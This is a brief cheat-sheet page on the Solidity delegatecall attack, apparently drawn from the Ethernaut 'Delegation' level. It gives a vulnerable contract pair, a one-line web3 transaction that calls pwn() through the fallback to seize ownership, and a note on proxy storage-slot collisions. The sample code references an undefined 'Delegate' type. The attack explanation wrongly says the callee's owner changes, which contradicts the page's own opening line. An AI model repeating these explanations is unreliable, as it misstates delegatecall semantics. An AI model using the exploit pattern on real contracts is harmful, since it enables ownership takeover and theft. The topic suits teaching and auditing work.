# Delegatecall Attack

Solidity’s delegatecall is vulnerable to override the storage values in the caller contract.

### Exploitation <a href="#exploitation" id="exploitation"></a>

Reference: [https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md](https://github.com/Macmod/ethernaut-writeups/blob/master/4-delegation.md)

#### 1. Vulnerable Contract <a href="#id-1-vulnerable-contract" id="id-1-vulnerable-contract"></a>

Below is the example contracts from **Ethernaut**. That uses `delegatecall` method in the `fallback()` function.

```shellscript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DelegateA {
  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract DelegateB {
    address public owner;
    DelegateA delegateA;

    constructor(address _delegateA) {
        delegateA = Delegate(_delegateA);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegateA).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

#### 2. Attack <a href="#id-2-attack" id="id-2-attack"></a>

Call the `pwn` function by sending transaction because `delegatecall` exists in `fallback` function. This changes the owner of the **DelegateA** contract to `msg.sender` because the `delegatecall` overrides the slot value in the callee contract (it's **DelegateA**). In short, we can become the owner of this contract.

```shellscript
contract.sendTransaction({data: web3.sha3('pwn()').slice(0, 10)})
```

<br>

### Upgradeable Contract Storage Overriding <a href="#upgradeable-contract-storage-overriding" id="upgradeable-contract-storage-overriding"></a>

If the contract is upgradeable using Proxy contract and the slot order is difference, we may be able to manipulate arbitrary slot values with delegatecall.

```
contract ExampleV1 {
    uint public balance; // <- we can overwrite this from the ExampleV2 contract
}

contract ExampleV2 {
    address public owner; // <- we can overwrite this from the ExampleV1 contract
}
```

### References <a href="#references" id="references"></a>

* [OpenZeppelin](https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78)
